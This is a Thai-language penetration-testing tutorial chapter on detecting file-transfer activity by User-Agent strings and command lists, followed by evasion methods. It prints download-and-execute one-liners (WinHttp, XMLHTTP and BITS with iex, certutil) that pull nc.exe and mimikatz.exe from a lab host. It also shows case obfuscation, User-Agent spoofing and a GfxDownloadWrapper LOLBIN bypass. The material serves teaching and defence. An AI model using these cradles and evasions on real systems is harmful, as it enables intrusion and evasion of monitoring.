# Detection (การตรวจจับ)

## บทนำ

การตรวจจับการถ่ายโอนไฟล์ที่เป็นอันตรายเป็นส่วนสำคัญของการป้องกันระบบ บทนี้จะอธิบายเทคนิคการตรวจจับที่ Defenders สามารถใช้เพื่อระบุกิจกรรมที่น่าสงสัย

---

## การตรวจจับบน Command-Line

### Blacklisting (รายการห้าม)

**ปัญหา:**
- **ง่ายต่อการหลีกเลี่ยง** แม้แต่การใช้เทคนิคง่ายๆ เช่น case obfuscation (เปลี่ยนตัวพิมพ์เล็ก-ใหญ่)

**ตัวอย่าง:**
```powershell
# คำสั่งปกติที่อาจถูก blacklist
Invoke-WebRequest

# หลีกเลี่ยงได้ง่ายๆ
InVoKe-WeBrEqUeSt
iNvOkE-wEbReQuEsT
```

### Whitelisting (รายการอนุญาต)

**ข้อดี:**
- **แข็งแกร่งมาก (Very Robust)**
- **ตรวจจับได้รวดเร็ว** - แจ้งเตือนได้ทันทีเมื่อพบคำสั่งผิดปกติ

**ข้อเสีย:**
- **ใช้เวลานานในการตั้งค่าครั้งแรก** - ต้องรวบรวมคำสั่งที่ถูกต้องทั้งหมดในสภาพแวดล้อม

**กระบวนการ:**
1. สร้างรายการคำสั่งที่ถูกต้องทั้งหมด
2. อนุญาตเฉพาะคำสั่งที่อยู่ในรายการ
3. คำสั่งใดที่ไม่อยู่ในรายการ = น่าสงสัย

---

## User Agent String Detection

### User Agent String คืออะไร?

**หลักการทำงาน:**
- Client และ Server ต้อง**เจรจา (negotiate)** ก่อนแลกเปลี่ยนข้อมูล
- ใช้บ่อยใน **HTTP Protocol**
- **User Agent String** ใช้ระบุตัวตน HTTP client

### สิ่งที่ใช้ User Agent String

**Web Browsers:**
- Firefox
- Chrome
- Safari
- Edge

**HTTP Clients อื่นๆ:**
- cURL
- Python scripts
- sqlmap
- Nmap
- PowerShell

---

## วิธีการตรวจจับ User Agent ที่น่าสงสัย

### ขั้นตอนที่องค์กรควรทำ

#### **1. สร้างรายการ User Agent ที่ถูกต้อง (Legitimate User Agents)**

**รวบรวม:**
- User agents จาก web browsers ที่ใช้ในองค์กร
- User agents ที่ระบบปฏิบัติการใช้โดยค่าเริ่มต้น
- User agents จาก update services:
  - Windows Update
  - Antivirus updates
  - Software update services

#### **2. นำเข้า SIEM (Security Information and Event Management)**

**วัตถุประสงค์:**
- ใช้สำหรับ **Threat Hunting**
- กรอง traffic ที่ถูกต้องออก
- โฟกัสที่ **anomalies** (สิ่งผิดปกติ)

#### **3. ตรวจสอบ User Agent ที่น่าสงสัย**

**เมื่อพบ suspicious user agent:**
- สืบสวนเพิ่มเติม
- ตรวจสอบว่าใช้ทำกิจกรรมที่เป็นอันตรายหรือไม่

### แหล่งข้อมูล User Agent Strings

**เว็บไซต์อ้างอิง:**
- รายการ User Agent Strings ทั่วไป
- ช่วยระบุ User Agents ที่พบบ่อย

---

## User Agents จากเทคนิคการถ่ายโอนไฟล์ทั่วไป

ข้อมูลต่อไปนี้ได้จากการทดสอบบน:
- **OS:** Windows 10, version 10.0.14393
- **PowerShell:** Version 5.1

---

## 1. Invoke-WebRequest / Invoke-RestMethod

### คำสั่งที่ใช้ (Client-Side)

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

หรือ

```powershell
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

### ที่เห็นบน Server

```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

**จุดสังเกต:**
- User-Agent ระบุชัดเจนว่าเป็น **WindowsPowerShell**
- รวมเวอร์ชันของ PowerShell

---

## 2. WinHttpRequest

### คำสั่งที่ใช้ (Client-Side)

```powershell
$h = new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```

### ที่เห็นบน Server

```http
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

**จุดสังเกต:**
- User-Agent ระบุว่าเป็น **WinHttp.WinHttpRequest.5**
- ใช้ COM object

---

## 3. Msxml2.XMLHTTP

### คำสั่งที่ใช้ (Client-Side)

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText
```

### ที่เห็นบน Server

```http
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

**จุดสังเกต:**
- User-Agent อ้างว่าเป็น **Internet Explorer 7.0**
- แต่รวมข้อมูล Windows 10 และ .NET versions
- การผสมผสานนี้น่าสงสัย

---

## 4. Certutil

### คำสั่งที่ใช้ (Client-Side)

```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe
```

หรือ

```cmd
certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

### ที่เห็นบน Server

```http
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

**จุดสังเกต:**
- User-Agent เป็น **Microsoft-CryptoAPI**
- แปลกถ้าใช้ดาวน์โหลดไฟล์ executable

---

## 5. BITS (Background Intelligent Transfer Service)

### คำสั่งที่ใช้ (Client-Side)

```powershell
Import-Module bitstransfer;
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
$r = gc $env:temp\t;
rm $env:temp\t;
iex $r
```

### ที่เห็นบน Server

```http
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

**จุดสังเกต:**
- ใช้ **HEAD request** ก่อน (ตรวจสอบไฟล์)
- User-Agent เป็น **Microsoft BITS**
- Accept-Encoding: identity (ไม่บีบอัด)

---

# Evading Detection (การหลบเลี่ยงการตรวจจับ)

## บทนำ

หลังจากที่เราเรียนรู้เกี่ยวกับการตรวจจับแล้ว บทนี้จะอธิบายเทคนิคที่ผู้ทดสอบเจาะระบบสามารถใช้เพื่อหลบเลี่ยงการตรวจจับในสภาพแวดล้อมที่มีการป้องกันอย่างเข้มงวด

> **หมายเหตุ:** เทคนิคเหล่านี้ควรใช้เฉพาะในการทดสอบเจาะระบบที่ได้รับอนุญาตเท่านั้น

---

## 1. Changing User Agent (เปลี่ยน User Agent)

### ปัญหาที่พบ
- ผู้ดูแลระบบหรือ Defenders อาจ **blacklist** User Agents ที่น่าสงสัย
- User Agent เริ่มต้นของ PowerShell เด่นชัดเกินไป

### วิธีแก้ไข
`Invoke-WebRequest` มีพารามิเตอร์ `UserAgent` ที่สามารถเปลี่ยน User Agent ให้เลียนแบบ web browsers ต่างๆ ได้

---

## User Agents ที่มีใน PowerShell

### ดูรายการ User Agents ที่พร้อมใช้งาน

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

### ผลลัพธ์

#### **1. Internet Explorer**
```
Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)
```

#### **2. Firefox**
```
Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0
```

#### **3. Chrome**
```
Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6
```

#### **4. Opera**
```
Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1
```

#### **5. Safari**
```
Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16
```

---

## การใช้งาน Custom User Agent

### ตัวอย่าง: ใช้ Chrome User Agent

**ขั้นตอนที่ 1: กำหนด User Agent**
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

**ขั้นตอนที่ 2: ดาวน์โหลดไฟล์พร้อม Custom User Agent**
```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### ผลลัพธ์ที่ Server เห็น

**เริ่ม Netcat Listener:**
```bash
nc -lvnp 80
```

**HTTP Request ที่ได้รับ:**
```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

### ข้อดี
- User Agent ดูเหมือน **Chrome browser** ปกติ
- ถ้าองค์กรใช้ Chrome ภายใน request นี้จะดู **legitimate**

---

## 2. LOLBAS / GTFOBins

### สถานการณ์ที่ต้องใช้

**เมื่อเจอปัญหาเหล่านี้:**
- **Application Whitelisting** ป้องกันไม่ให้ใช้ PowerShell หรือ Netcat
- **Command-line Logging** จะแจ้งเตือน Defenders ทันที
- เครื่องมือปกติถูกบล็อกหมด

### วิธีแก้: ใช้ LOLBIN

**LOLBIN (Living Off the Land Binary):**
- เรียกอีกอย่างว่า **"Misplaced Trust Binaries"**
- Binaries ที่ถูกต้องตามกฎหมายแต่สามารถใช้ผิดวัตถุประสงค์ได้
- มักได้รับอนุญาตจาก Application Whitelisting
- อาจถูก **ยกเว้นจากการแจ้งเตือน**

---

## ตัวอย่าง LOLBIN: GfxDownloadWrapper.exe

### ข้อมูลทั่วไป
- **ชื่อเต็ม:** Intel Graphics Driver for Windows 10
- **ติดตั้งบน:** ระบบบางตัวที่มี Intel Graphics
- **ฟังก์ชันต้นฉบับ:** ดาวน์โหลด configuration files เป็นระยะ
- **ใช้ผิดวัตถุประสงค์:** ดาวน์โหลดไฟล์ใดก็ได้

### การใช้งาน

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

**Syntax:**
```
GfxDownloadWrapper.exe "<URL ต้นทาง>" "<ปลายทางบนเครื่อง>"
```

### ทำไมถึงได้ผล?
1. **Application Whitelisting อนุญาต** - เพราะเป็น binary ที่ถูกต้อง
2. **ไม่ถูก Alert** - ไม่ได้อยู่ใน watchlist
3. **ดูเป็นการใช้งานปกติ** - Intel driver update

---

